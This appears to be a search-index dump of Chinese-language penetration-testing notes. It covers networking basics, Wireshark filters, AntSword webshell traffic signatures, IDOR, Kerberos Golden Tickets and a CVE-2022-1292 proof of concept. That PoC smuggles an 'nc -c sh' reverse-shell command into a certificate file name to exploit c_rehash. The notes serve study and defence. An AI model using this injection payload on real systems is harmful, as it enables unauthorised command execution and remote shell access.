<p>\u6709\u7684\u6f0f\u6d1e\u5229\u7528\u5728\u5b9e\u6218\u4e2d\u6d89\u53ca\u4e86\u4e00\u4e9b\u5f88\u539f\u7406\u7684\u4e1c\u897f\uff0c\u5bf9\u4e8e\u6e17\u900f\u4eba\u5458\u7684\u57fa\u672c\u529f\u8003\u5bdf\u4ee5\u53ca\u8054\u60f3\u80fd\u529b\u7684\u8003\u67e5\u662f\u5f88\u5f3a\u7684\uff0c\u56e0\u6b64\u8fd9\u4e2a\u65f6\u5019\u6280\u672f\u66f4\u597d\u7684\u4eba\u5c31\u53ef\u4ee5\u51f8\u663e\u4f18\u52bf\u3002</p> <p>\u4e3e\u4e00\u4e2a\u7a0d\u5fae\u6781\u7aef\u7684\u4f8b\u5b50ctf\uff0c\u505a\u9898\u662f\u9700\u8981\u7406\u89e3\u7684\uff0c\u4e0d\u4f1a\u5c31\u662f\u4e0d\u4f1a\u591a\u4e45\u90fd\u505a\u4e0d\u51fa\u6765\uff0c\u4fe1\u606f\u641c\u96c6\u53ea\u8981\u544a\u8bc9\u4e86\u57fa\u672c\u65b9\u6cd5\uff0c\u57fa\u672c\u90fd\u80fd\u505a\uff0c\u53ea\u662f\u719f\u7ec3\u5ea6\u6709\u5dee\u522b\uff0c\u4fe1\u606f\u641c\u96c6\u7684\u6548\u7387\u6709\u5dee\u522b\u800c\u5df2\u3002</p> <p>\u5c31\u6280\u672f\u4eba\u5458\u4e2a\u4f53\u800c\u8a00\uff0c\u5355\u7eaf\u505a\u4e00\u4e2a\u719f\u7ec3\u5de5\uff0c\u662f\u5f88\u5bb9\u6613\u88ab\u6dd8\u6c70\u7684\uff0c\u5e94\u5f53\u82b1\u66f4\u591a\u65f6\u95f4\u5728\u6280\u672f\u7684\u6df1\u5316\u4e0a\uff0c \u5efa\u7acb\u81ea\u5df1\u7684\u7ade\u4e89\u58c1\u5792\u3002</p> <p>\u6280\u672f\u7684\u6df1\u5316\uff0c\u4ee3\u7801\u80fd\u529b\u662f\u57fa\u7840\uff0c\u8fdb\u4e00\u6b65\u5bf9\u5404\u4e2a\u7cfb\u7edf\u548c\u6f0f\u6d1e\u539f\u7406\u7684\u7406\u89e3\uff0c\u662f\u5ef6\u4f38\u4e0d\u65ad\u7684\u5b66\u4e60\u548c\u7a81\u7834\uff0c\u6700\u540e\u6280\u672f\u5c31\u4f1a\u8d8a\u6765\u8d8a\u597d\uff0c\u4e5f\u5c31\u4f1a\u8131\u79bb\u4fe1\u606f\u641c\u96c6\u7684\u5faa\u73af\uff0c\u8fc8\u5165\u66f4\u9ad8\u7684\u5c42\u9762\u3002</p> <p>\u4e0d\u8fc7\u505a\u9879\u76ee\u65f6\u5019\u7684\u4fe1\u606f\u641c\u96c6\uff0c\u90a3\u516c\u53f8\u9879\u76ee\u662f\u4e0d\u53ef\u907f\u514d\u7684\uff0c\u516c\u53f8\u82b1\u94b1\u8bf7\u4eba\u6765\u5c31\u662f\u5e72\u8fd9\u4e2a\u7684\u3002</p> <p>\u6280\u672f\u6808\u7684\u7a81\u7834\u548c\u5ef6\u4f38\u662f\u81ea\u5df1\u7684\u4e8b\u60c5\u3002\u66f4\u4f18\u7684\u89e3\u6cd5\u5c31\u662f\u5148\u96c6\u4e2d\u82b1\u4e00\u90e8\u5206\u65f6\u95f4\u7ec3\u4e60\u4fe1\u606f\u6536\u96c6\uff0c\u7136\u540e\u914d\u5408\u81ea\u7814\u7684\u5c0f\u5de5\u5177\u628a\u6548\u7387\u63d0\u4e0a\u53bb\uff0c\u7ec3\u5230\u4e86\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u505a\u9879\u76ee\u7684\u65f6\u5019\u4fe1\u606f\u641c\u96c6\u57fa\u672c\u90fd\u80fd\u51fa\u4e1c\u897f\u4e86\uff0c\u516c\u53f8\u8fd9\u8fb9\u80fd\u8ddf\u5ba2\u6237\u4ea4\u5dee\u4e86\uff0c\u518d\u628a\u65f6\u95f4\u82b1\u5230\u6f0f\u6d1e\u7684\u7a81\u7834\u548c\u5ef6\u4f38\u4e0a\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/","title":"\u7f51\u7edc\u7b80\u4ecb","text":""},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_1","title":"\u6982\u8ff0","text":"<p>\u7f51\u7edc\u4f7f\u4e24\u53f0\u8ba1\u7b97\u673a\u80fd\u591f\u76f8\u4e92\u901a\u4fe1\u3002\u6709\u591a\u79cd<code>topologies</code>\uff08\u7f51\u72b6/\u6811\u72b6/\u661f\u5f62\uff09\u3001<code>mediums</code>\uff08\u4ee5\u592a\u7f51/\u5149\u7ea4/\u540c\u8f74\u7535\u7f06/\u65e0\u7ebf\uff09\u548c<code>protocols</code>\uff08TCP/UDP/IPX\uff09\u53ef\u7528\u4e8e\u4fc3\u8fdb\u7f51\u7edc\u3002\u4f5c\u4e3a\u5b89\u5168\u4e13\u4e1a\u4eba\u58eb\uff0c\u4e86\u89e3\u7f51\u7edc\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u5f53\u7f51\u7edc\u51fa\u73b0\u6545\u969c\u65f6\uff0c\u9519\u8bef\u53ef\u80fd\u662f\u65e0\u58f0\u7684\uff0c\u5bfc\u81f4\u6211\u4eec\u9519\u8fc7\u4e00\u4e9b\u4e1c\u897f\u3002</p> <p>\u5efa\u7acb\u4e00\u4e2a\u5927\u800c\u6241\u5e73\u7684\u7f51\u7edc\u5e76\u4e0d\u662f\u975e\u5e38\u56f0\u96be\uff0c\u5b83\u53ef\u4ee5\u662f\u4e00\u4e2a\u53ef\u9760\u7684\u7f51\u7edc\uff0c\u81f3\u5c11\u5728\u64cd\u4f5c\u4e0a\u662f\u8fd9\u6837\u3002\u4f46\u662f\uff0c\u6241\u5e73\u7f51\u7edc\u5c31\u50cf\u5728\u4e00\u5757\u571f\u5730\u4e0a\u5efa\u9020\u623f\u5c4b\u5e76\u8ba4\u4e3a\u5b83\u662f\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u5b83\u5728\u95e8\u4e0a\u6709\u9501\u3002\u901a\u8fc7\u521b\u5efa\u8bb8\u591a\u8f83\u5c0f\u7684\u7f51\u7edc\u5e76\u8ba9\u5b83\u4eec\u8fdb\u884c\u901a\u4fe1\uff0c\u6211\u4eec\u53ef\u4ee5\u6dfb\u52a0\u9632\u5fa1\u5c42\u3002\u56f4\u7ed5\u7f51\u7edc\u8fdb\u884c\u65cb\u8f6c\u5e76\u4e0d\u56f0\u96be\uff0c\u4f46\u5feb\u901f\u800c\u65e0\u58f0\u5730\u8fdb\u884c\u64cd\u4f5c\u5f88\u56f0\u96be\uff0c\u5e76\u4e14\u4f1a\u51cf\u6162\u653b\u51fb\u8005\u7684\u901f\u5ea6\u3002\u56de\u5230\u623f\u5b50\u573a\u666f\uff0c\u8ba9\u6211\u4eec\u6765\u770b\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#1","title":"\u793a\u4f8b 1","text":"<p>\u6784\u5efa\u8f83\u5c0f\u7684\u7f51\u7edc\u5e76\u5728\u5176\u5468\u56f4\u653e\u7f6e\u8bbf\u95ee\u63a7\u5236\u5217\u8868\u5c31\u50cf\u5728\u7269\u4e1a\u8fb9\u754c\u5468\u56f4\u8bbe\u7f6e\u56f4\u680f\uff0c\u521b\u5efa\u7279\u5b9a\u7684\u5165\u53e3\u548c\u51fa\u53e3\u70b9\u3002\u662f\u7684\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8df3\u8fc7\u6805\u680f\uff0c\u4f46\u8fd9\u770b\u8d77\u6765\u5f88\u53ef\u7591\u5e76\u4e14\u5e76\u4e0d\u5e38\u89c1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5feb\u901f\u5c06\u5176\u68c0\u6d4b\u4e3a\u6076\u610f\u6d3b\u52a8\u3002\u4e3a\u4ec0\u4e48\u6253\u5370\u673a\u7f51\u7edc\u901a\u8fc7 HTTP \u4e0e\u670d\u52a1\u5668\u901a\u4fe1\uff1f</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#2","title":"\u793a\u4f8b 2","text":"<p>\u82b1\u65f6\u95f4\u7ed8\u5236\u548c\u8bb0\u5f55\u6bcf\u4e2a\u7f51\u7edc\u7684\u7528\u9014\u5c31\u50cf\u5728\u7269\u4e1a\u5468\u56f4\u653e\u7f6e\u706f\u5149\uff0c\u786e\u4fdd\u53ef\u4ee5\u770b\u5230\u6240\u6709\u6d3b\u52a8\u3002\u4e3a\u4ec0\u4e48\u6253\u5370\u673a\u7f51\u7edc\u5b8c\u5168\u4e0e Internet \u901a\u4fe1\uff1f</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#3","title":"\u793a\u4f8b 3","text":"<p>\u7a97\u6237\u5468\u56f4\u6709\u704c\u6728\u4e1b\u5bf9\u8bd5\u56fe\u6253\u5f00\u7a97\u6237\u7684\u4eba\u8d77\u5230\u5a01\u6151\u4f5c\u7528\u3002\u5c31\u50cf Suricata \u6216 Snort \u8fd9\u6837\u7684\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u5bf9\u8fd0\u884c\u7f51\u7edc\u626b\u63cf\u5177\u6709\u5a01\u6151\u4f5c\u7528\u3002\u4e3a\u4ec0\u4e48\u7aef\u53e3\u626b\u63cf\u6e90\u81ea\u6253\u5370\u673a\u7f51\u7edc\uff1f</p> <p>\u8fd9\u4e9b\u793a\u4f8b\u53ef\u80fd\u542c\u8d77\u6765\u5f88\u611a\u8822\uff0c\u963b\u6b62\u6253\u5370\u673a\u6267\u884c\u4e0a\u8ff0\u6240\u6709\u64cd\u4f5c\u662f\u5e38\u8bc6\u3002\u4f46\u662f\uff0c\u5982\u679c\u6253\u5370\u673a\u4f4d\u4e8e\u201c\u5e73\u9762 /24 \u7f51\u7edc\u201d\u5e76\u83b7\u5f97 DHCP \u5730\u5740\uff0c\u5219\u5bf9\u5b83\u4eec\u8bbe\u7f6e\u8fd9\u4e9b\u7c7b\u578b\u7684\u9650\u5236\u53ef\u80fd\u5177\u6709\u6311\u6218\u6027\u3002</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_2","title":"\u6545\u4e8b\u65f6\u95f4\u2014\u2014\u6e17\u900f\u6d4b\u8bd5\u8005\u7684\u76d1\u7763","text":"<p>\u5927\u591a\u6570\u7f51\u7edc\u90fd\u4f7f\u7528<code>/24</code>\u5b50\u7f51\uff0c\u4ee5\u81f3\u4e8e\u8bb8\u591a\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u4f1a\u5728\u4e0d\u68c0\u67e5\u7684\u60c5\u51b5\u4e0b\u8bbe\u7f6e\u6b64\u5b50\u7f51\u63a9\u7801 (255.255.255.0)\u3002\u53ea\u8981 IP \u5730\u5740\u7684\u524d\u4e09\u4e2a\u516b\u4f4d\u5b57\u8282\u76f8\u540c\uff08\u4f8b\u5982\uff1a192.168.1.xxx\uff09\uff0c/24 \u7f51\u7edc\u5c31\u5141\u8bb8\u8ba1\u7b97\u673a\u76f8\u4e92\u901a\u4fe1\u3002\u5c06\u5b50\u7f51\u63a9\u7801\u8bbe\u7f6e\u4e3a<code>/25</code>\u5c06\u6b64\u8303\u56f4\u4e00\u5206\u4e3a\u4e8c\uff0c\u8ba1\u7b97\u673a\u5c06\u53ea\u80fd\u4e0e\u201c\u5b83\u7684\u4e00\u534a\u201d\u4e0a\u7684\u8ba1\u7b97\u673a\u901a\u4fe1\u3002\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a\uff0c\u5176\u4e2d\u8bc4\u4f30\u8005\u58f0\u79f0\u57df\u63a7\u5236\u5668\u5728\u73b0\u5b9e\u4e2d\u53ea\u662f\u5728\u4e0d\u540c\u7684\u7f51\u7edc\u4e0a\u65f6\u5904\u4e8e\u8131\u673a\u72b6\u6001\u3002\u7f51\u7edc\u7ed3\u6784\u662f\u8fd9\u6837\u7684\uff1a</p> <ul> <li>\u670d\u52a1\u5668\u7f51\u5173\uff1a10.20.0.1/25</li> <li>\u57df\u63a7\u5236\u5668\uff1a10.20.0.10/25</li> <li>\u5ba2\u6237\u7aef\u7f51\u5173\uff1a10.20.0.129/25</li> <li>\u5ba2\u6237\u7aef\u5de5\u4f5c\u7ad9\uff1a10.20.0.200/25</li> <li>Pentester IP\uff1a10.20.0.252/24\uff08\u8bbe\u7f6e\u7f51\u5173\u4e3a10.20.0.1\uff09</li> </ul> <p>Pentester \u4e0e\u5ba2\u6237\u7aef\u5de5\u4f5c\u7ad9\u8fdb\u884c\u4e86\u6c9f\u901a\uff0c\u5e76\u8ba4\u4e3a\u4ed6\u4eec\u505a\u5f97\u5f88\u597d\uff0c\u56e0\u4e3a\u4ed6\u4eec\u8bbe\u6cd5\u901a\u8fc7 Impacket \u7a83\u53d6\u4e86\u5de5\u4f5c\u7ad9\u5bc6\u7801\u3002\u7136\u800c\uff0c\u7531\u4e8e\u65e0\u6cd5\u7406\u89e3\u7f51\u7edc\uff0c\u4ed6\u4eec\u4ece\u672a\u8bbe\u6cd5\u8131\u79bb\u5ba2\u6237\u7aef\u7f51\u7edc\u5e76\u5230\u8fbe\u66f4\u591a\u201c\u9ad8\u4ef7\u503c\u201d\u76ee\u6807\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3002\u5e0c\u671b\u5982\u679c\u8fd9\u542c\u8d77\u6765\u8ba9\u60a8\u611f\u5230\u56f0\u60d1\uff0c\u60a8\u53ef\u4ee5\u56de\u5230\u6a21\u5757\u672b\u5c3e\u7684\u8fd9\u53e5\u8bdd\u5e76\u7406\u89e3\u5b83\uff01</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/%E7%BD%91%E7%BB%9C%E7%AE%80%E4%BB%8B/#_3","title":"\u57fa\u672c\u4fe1\u606f","text":"<p>\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u4ee5\u4e0b\u9ad8\u7ea7\u56fe\u8868\uff0c\u8bf4\u660e\u5728\u5bb6\u5de5\u4f5c\u8bbe\u7f6e\u5982\u4f55\u5de5\u4f5c\u3002 ![[Pasted image 20221024202551.png]]</p>"},{"location":"%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"\u6d41\u91cf\u5206\u6790","text":"<p>\u6d41\u91cf\u5206\u6790</p> <p>wireshark</p> <p>\u6355\u83b7\u8fc7\u6ee4\u5668</p> <p>\u4f7f\u7528BPF\u8bed\u6cd5 <code>host 214.15.2.30</code>\uff0c\u4e0e<code>tcpdump</code>\u76f8\u4f3c\u3002\u5728\u6293\u5305\u524d\u5efa\u7acb\u89c4\u5219\u51cf\u5c11\u5608\u6742\u6570\u636e\u5305\u3002</p> Capture Filters Result host x.x.x.x \u4ec5\u6355\u83b7\u4e0e\u7279\u5b9a\u4e3b\u673a\u6709\u5173\u7684\u6d41\u91cf net x.x.x.x/24 \u4ec5\u6355\u83b7\u7279\u5b9a\u7f51\u6bb5\u7684\u6d41\u91cf src/dst net x.x.x.x/24 \u4ec5\u6355\u83b7\u6e90/\u76ee\u5730\u5740\u4e3a\u7279\u5b9a\u7f51\u6bb5\u7684\u6d41\u91cf port # \u4ec5\u6355\u83b7\u6307\u5b9a\u7aef\u53e3\u7684\u6d41\u91cf not port # \u6392\u9664\u6355\u83b7\u6307\u5b9a\u7aef\u53e3\u7684\u6d41\u91cf port # and # AND \u8fde\u63a5\u7684\u7aef\u53e3\u5747\u6355\u83b7 portrange # \u6355\u83b7\u6307\u5b9a\u8303\u56f4\u5185\u7684\u7aef\u53e3\u6d41\u91cf ip / ether / tcp \u4ec5\u6355\u83b7\u6307\u5b9a\u534f\u8bae\u5934\u6d41\u91cf broadcast /multicast / unicast \u6293\u53d6\u7279\u5b9a\u7c7b\u578b\u7684\u6d41\u91cf\u3002\u5e7f\u64ad\uff0c\u591a\u64ad\uff0c\u5355\u64ad <p>\u5e94\u7528\u6355\u83b7\u8fc7\u6ee4\u5668</p> <p>\u8fc7\u6ee4\u5668\u5217\u8868\uff1awireshark\u5185\u7f6e\u8fc7\u6ee4\u5668\u3002\u53ef\u4fee\u6539\u73b0\u6709\u8fc7\u6ee4\u5668\u6216\u6dfb\u52a0\u65b0\u89c4\u5219</p> <p>\u8981\u5c06\u8fc7\u6ee4\u5668\u5e94\u7528\u4e8e\u6355\u83b7\uff0c\u9700\u8981\u627e\u5230 capture-&gt;options(cmd+k)</p> <p>\u663e\u793a\u8fc7\u6ee4\u5668</p> Display Filters Result ip.addr == x.x.x.x \u4ec5\u6355\u83b7\u4e0e\u67d0\u4e2a\u4e3b\u673a\u6709\u5173\u7684\u6d41\u91cf ip.addr == x.x.x.x/24 ip.src/dst == x.x.x.x dns/tcp/ftp/arp/ip \u901a\u8fc7\u7279\u5b9a\u534f\u8bae\u8fc7\u6ee4\u6d41\u91cf tcp.port == x \u6309\u7279\u5b9atcp \u7aef\u53e3\u8fc7\u6ee4 src.port / dst.port  == x and / or /not And\u8fde\u63a5\uff0cOr\u4e24\u8005\u6ee1\u8db3\u5176\u4e00,Not\u6392\u9664\u6240\u8f93\u5165\u9009\u9879"},{"location":"%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/","title":"\u6d41\u91cf\u5206\u6790\u62a5\u544a","text":""},{"location":"%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/#antsword_php_chr","title":"antsword_php_chr","text":"<p>\u7279\u5f81\u4e00\uff1aUA\u5934\u9ed8\u8ba4\u4e3a\u8681\u5251\u540d\u79f0\u53ca\u7248\u672c\u4fe1\u606f</p> <p><code>User-Agent: antSword/v2.1</code></p> <p>\u7279\u5f81\u4e8c\uff1aPHP eVAl() \u51fd\u6570</p> <p>\u653b\u51fb\u6210\u529f</p> <p>\u4f9d\u636e\uff1a</p> <p>\u200b   \u54cd\u5e94\u7801 200</p> <p>\u200b   </p>"},{"location":"%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%AE%80%E4%BB%8B/","title":"\u6982\u8ff0","text":"<p>Network Traffic Analysis (NTA)\u53ef\u4ee5\u63cf\u8ff0\u4e3a\u68c0\u67e5\u7f51\u7edc\u6d41\u91cf\u4ee5\u8868\u5f81\u6240\u4f7f\u7528\u7684\u5e38\u7528\u7aef\u53e3\u548c\u534f\u8bae\u3001\u4e3a\u6211\u4eec\u7684\u73af\u5883\u5efa\u7acb\u57fa\u7ebf\u3001\u76d1\u63a7\u3001\u548c\u54cd\u5e94\u5a01\u80c1\u4ee5\u53ca\u786e\u4fdd\u5c3d\u53ef\u80fd\u4f38\u5165\u5730\u4e86\u89e3\u6211\u4eec\u7ec4\u7ec7\u7684\u7f51\u7edc\u884c\u4e3a\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CVE-2022-1292/","title":"CVE 2022 1292","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CVE-2022-1292/#_1","title":"\u8bf4\u660e","text":"<p>c_rehash \u811a\u672c\u672a\u6b63\u786e\u6e05\u7406 shell metacharacters(\u6e90\u5b57\u7b26) \u4ee5\u9632\u6b62\u547d\u4ee4\u6ce8\u5165\u3002 \u6b64\u811a\u672c\u7531\u67d0\u4e9b\u64cd\u4f5c\u7cfb\u7edf\u4ee5\u81ea\u52a8\u6267\u884c\u7684\u65b9\u5f0f\u5206\u53d1\u3002 \u5728\u8fd9\u6837\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u811a\u672c\u7684\u6743\u9650\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002 \u4f7f\u7528 c_rehash \u811a\u672c\u88ab\u8ba4\u4e3a\u662f\u8fc7\u65f6\u7684\uff0c\u5e94\u8be5\u7531 OpenSSL rehash \u547d\u4ee4\u884c\u5de5\u5177\u4ee3\u66ff\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/CVE-2022-1292/#poc","title":"POC","text":"<p>![[Pasted image 20221013172057.png]]</p> <ol> <li>Navigate to <code>/etc/ssl/certs/</code> (defalut) or other paths configured in update-ca-certificates</li> <li><code>echo \"-----BEGIN CERTIFICATE------\" &gt; \"hey.crt\\'nc -c sh 127.0.0.1 12345\\'\"</code> (nc as payload example)</li> <li>Then wait until execution of update-ca-certificates. You can trigger it manually with <code>c_rehash .</code></li> </ol> <pre><code></code></pre> <p>\u5f71\u54cd\u8303\u56f4 -   Fixed in OpenSSL 3.0.3\u00a0(git commit)\u00a0(Affected 3.0.0,3.0.1,3.0.2) -   Fixed in OpenSSL 1.1.1o\u00a0(git commit)\u00a0(Affected 1.1.1-1.1.1n) -   Fixed in OpenSSL 1.0.2ze\u00a0(premium support)\u00a0(Affected 1.0.2-1.0.2zd)</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Insecure%20direct%20object%20references%20%28IDOR%29/","title":"Insecure direct object references (IDOR)","text":"<p>\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Insecure%20direct%20object%20references%20%28IDOR%29/#idor","title":"\u4ec0\u4e48\u662f\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 (IDOR)\uff1f","text":"<p>\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528 (IDOR) \u662f\u4e00\u79cd\u8bbf\u95ee\u63a7\u5236\u6f0f\u6d1e\uff0c\u5f53\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7528\u6237\u63d0\u4f9b\u7684\u8f93\u5165\u76f4\u63a5\u8bbf\u95ee\u5bf9\u8c61\u65f6\u4f1a\u51fa\u73b0\u8fd9\u79cd\u6f0f\u6d1e\u3002 IDOR \u4e00\u8bcd\u56e0\u51fa\u73b0\u5728 OWASP 2007 \u524d\u5341\u540d\u4e2d\u800c\u6d41\u884c\u8d77\u6765\u3002\u7136\u800c\uff0c\u8fd9\u53ea\u662f\u8bb8\u591a\u8bbf\u95ee\u63a7\u5236\u5b9e\u65bd\u9519\u8bef\u4e2d\u7684\u4e00\u4e2a\u4f8b\u5b50\uff0c\u8fd9\u4e9b\u9519\u8bef\u53ef\u80fd\u5bfc\u81f4\u8bbf\u95ee\u63a7\u5236\u88ab\u89c4\u907f\u3002 IDOR \u6f0f\u6d1e\u6700\u5e38\u4e0e\u6c34\u5e73\u6743\u9650\u63d0\u5347\u76f8\u5173\uff0c\u4f46\u5b83\u4eec\u4e5f\u53ef\u80fd\u4e0e\u5782\u76f4\u6743\u9650\u63d0\u5347\u76f8\u5173\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Insecure%20direct%20object%20references%20%28IDOR%29/#idor_1","title":"IDOR \u793a\u4f8b","text":"<p>\u6709\u8bb8\u591a\u8bbf\u95ee\u63a7\u5236\u6f0f\u6d1e\u7684\u793a\u4f8b\uff0c\u5176\u4e2d\u7528\u6237\u63a7\u5236\u7684\u53c2\u6570\u503c\u7528\u4e8e\u76f4\u63a5\u8bbf\u95ee\u8d44\u6e90\u6216\u529f\u80fd\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Insecure%20direct%20object%20references%20%28IDOR%29/#idor_2","title":"\u76f4\u63a5\u5f15\u7528\u6570\u636e\u5e93\u5bf9\u8c61\u7684 IDOR \u6f0f\u6d1e","text":"<p>\u8003\u8651\u4e00\u4e2a\u7f51\u7ad9\uff0c\u5b83\u4f7f\u7528\u4ee5\u4e0b URL \u901a\u8fc7\u4ece\u540e\u7aef\u6570\u636e\u5e93\u68c0\u7d22\u4fe1\u606f\u6765\u8bbf\u95ee\u5ba2\u6237\u5e10\u6237\u9875\u9762\uff1a</p> <pre><code>https://insecure-website.com/customer_account?customer_number=132355\n</code></pre> <p>\u5728\u8fd9\u91cc\uff0c\u5ba2\u6237\u7f16\u53f7\u76f4\u63a5\u7528\u4f5c\u5bf9\u540e\u7aef\u6570\u636e\u5e93\u6267\u884c\u7684\u67e5\u8be2\u4e2d\u7684\u8bb0\u5f55\u7d22\u5f15\u3002\u5982\u679c\u6ca1\u6709\u5176\u4ed6\u63a7\u5236\u63aa\u65bd\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7b80\u5355\u5730\u4fee\u6539 customer_number \u503c\uff0c\u7ed5\u8fc7\u8bbf\u95ee\u63a7\u5236\u6765\u67e5\u770b\u5176\u4ed6\u5ba2\u6237\u7684\u8bb0\u5f55\u3002\u8fd9\u662f\u5bfc\u81f4\u6c34\u5e73\u6743\u9650\u63d0\u5347\u7684 IDOR \u6f0f\u6d1e\u793a\u4f8b\u3002 </p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u80fd\u591f\u901a\u8fc7\u5c06\u7528\u6237\u66f4\u6539\u4e3a\u5177\u6709\u989d\u5916\u6743\u9650\u7684\u7528\u6237\u540c\u65f6\u7ed5\u8fc7\u8bbf\u95ee\u63a7\u5236\u6765\u6267\u884c\u6c34\u5e73\u548c\u5782\u76f4\u6743\u9650\u63d0\u5347\u3002\u5176\u4ed6\u53ef\u80fd\u6027\u5305\u62ec\u5229\u7528\u5bc6\u7801\u6cc4\u6f0f\u6216\u4fee\u6539\u53c2\u6570\uff0c\u4f8b\u5982\uff0c\u4e00\u65e6\u653b\u51fb\u8005\u767b\u9646\u7528\u6237\u7684\u5e10\u6237\u9875\u9762\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Insecure%20direct%20object%20references%20%28IDOR%29/#idor_3","title":"\u76f4\u63a5\u5f15\u7528\u9759\u6001\u6587\u4ef6\u7684 IDOR \u6f0f\u6d1e","text":"<p>\u5f53\u654f\u611f\u8d44\u6e90\u4f4d\u4e8e\u670d\u52a1\u5668\u7aef\u6587\u4ef6\u7cfb\u7edf\u7684\u9759\u6001\u6587\u4ef6\u4e2d\u65f6\uff0c\u901a\u5e38\u4f1a\u51fa\u73b0 IDOR \u6f0f\u6d1e\u3002\u4f8b\u5982\uff0c\u7f51\u7ad9\u53ef\u80fd\u4f1a\u4f7f\u7528\u9012\u589e\u7684\u6587\u4ef6\u540d\u5c06\u804a\u5929\u6d88\u606f\u8bb0\u5f55\u4fdd\u5b58\u5230\u78c1\u76d8\uff0c\u5e76\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u8bbf\u95ee\u5982\u4e0b URL \u6765\u68c0\u7d22\u8fd9\u4e9b\u5185\u5bb9\uff1a</p> <pre><code>https://insecure-website.com/static/12144.txt\n</code></pre> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7b80\u5355\u5730\u4fee\u6539\u6587\u4ef6\u540d\u6765\u68c0\u7d22\u53e6\u4e00\u4e2a\u7528\u6237\u521b\u5efa\u7684\u526f\u672c\uff0c\u5e76\u53ef\u80fd\u83b7\u53d6\u7528\u6237\u51ed\u636e\u548c\u5176\u4ed6\u654f\u611f\u6570\u636e\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/","title":"\u4ec0\u4e48\u662f\u9ec4\u91d1\u7968\u636e\u4e0e\u767d\u94f6\u7968\u636e","text":"<p>Kerberos\u8ba4\u8bc1\uff1f KDC AS TGS TGT Pass The Ticket Golden Ticket Silver Ticket</p> <p>SPN(Service Principal Names)\uff1aPC\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u552f\u4e00\u6807\u8bc6</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/#golden-ticket","title":"Golden Ticket","text":"<p>\u9ec4\u91d1\u7968\u636e\uff0c\u5728\u638c\u63e1 <code>krbtgt</code> \u7528\u6237\u7684 hash \u503c\u540e\uff0c\u53ef\u4ee5\u4f2a\u9020 <code>TGT</code>\uff0c\u901a\u8fc7\u4f2a\u9020\u7684 <code>TGT</code> \u53ef\u4ee5\u83b7\u53d6\u5230\u57df\u63a7\u6743\u9650\uff0c\u8bbf\u95ee\u72f1\u5185\u4efb\u4f55\u670d\u52a1\uff0c\u5e38\u7528\u6765\u6743\u9650\u7ef4\u6301\u3002</p> 